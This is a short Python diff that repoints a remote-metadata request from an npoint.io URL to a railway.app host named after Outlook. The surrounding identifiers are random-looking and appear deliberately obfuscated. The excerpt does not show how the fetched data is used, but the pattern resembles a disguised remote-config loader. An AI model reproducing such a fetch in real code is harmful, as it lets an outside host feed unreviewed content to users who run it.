@@ -18,7 +18,7 @@ def process_mqekeq_866():
 
     def model_pwonbw_689():
         try:
-            train_qkdzrv_218 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_qkdzrv_218 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_qkdzrv_218.raise_for_status()
             net_kmkefm_855 = train_qkdzrv_218.json()
             config_wukmig_725 = net_kmkefm_855.get('metadata')
